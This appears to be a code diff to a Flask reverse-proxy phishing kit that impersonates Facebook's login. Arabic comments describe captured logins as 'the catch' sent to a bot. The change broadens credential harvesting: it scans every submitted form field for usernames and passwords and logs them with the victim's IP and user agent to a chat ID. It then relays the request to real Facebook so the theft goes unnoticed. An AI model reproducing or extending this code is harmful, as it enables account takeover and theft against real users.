@@ -92,27 +92,43 @@ def init_facebook_routes(app, bot):
             }
             headers_to_forward['Host'] = urlparse(real_fb_url).netloc
             headers_to_forward['User-Agent'] = request.headers.get("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
-            headers_to_forward['Accept-Encoding'] = 'identity' # لمنع ضغط البيانات وقراءتها بشكل سليمة
+            headers_to_forward['Accept-Encoding'] = 'identity'
             
             cookies_to_forward = request.cookies
 
             if request.method == 'POST':
-                username = request.form.get('email') or request.form.get('pass') # احترازي
-                password = request.form.get('pass')
+                # البحث الشامل عن حقول الدخول بغض النظر عن اسم المتغير في نموذج الفيسبوك
+                form_data = request.form.to_dict()
                 
+                username = None
+                password = None
+                
+                for key, val in form_data.items():
+                    key_lower = key.lower()
+                    if any(k in key_lower for k in ['email', 'user', 'phone', 'login', 'account']):
+                        username = val
+                    elif any(k in key_lower for k in ['pass', 'pwd', 'password', 'secret']):
+                        password = val
+
+                # إذا لم يتم العثور بالاسم، جرب المفاتيح الافتراضية
+                if not username:
+                    username = request.form.get('email') or request.form.get('identifier') or request.form.get('pass')
+                if not password:
+                    password = request.form.get('pass') or request.form.get('password')
+
                 source_ip = request.headers.get('CF-Connecting-IP') or \
                             request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
                             request.remote_addr
                 user_agent = request.headers.get('User-Agent', 'Unknown')
 
-                # التقاط البيانات إذا وجدت في الـ POST
+                # إرسال الصيد للبوت فور التقاطه
                 if username and target_chat_id:
-                    save_credentials_to_db("Facebook", username, password or "N/A", source_ip, user_agent, target_chat_id, bot)
+                    save_credentials_to_db("Facebook", username, password or "غير متاح", source_ip, user_agent, target_chat_id, bot)
                 
                 proxied_response = requests.post(
                     url=real_fb_url,
                     headers=headers_to_forward,
-                    data=request.get_data(),
+                    data=request.form,
                     cookies=cookies_to_forward,
                     allow_redirects=False,
                     timeout=15
@@ -131,7 +147,6 @@ def init_facebook_routes(app, bot):
             if "text/html" not in content_type:
                 return Response(proxied_response.content, status=proxied_response.status_code, content_type=content_type)
 
-            # معالجة النص وفكه بشكل آمن
             html_content = proxied_response.content.decode('utf-8', errors='ignore')
             modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)
             
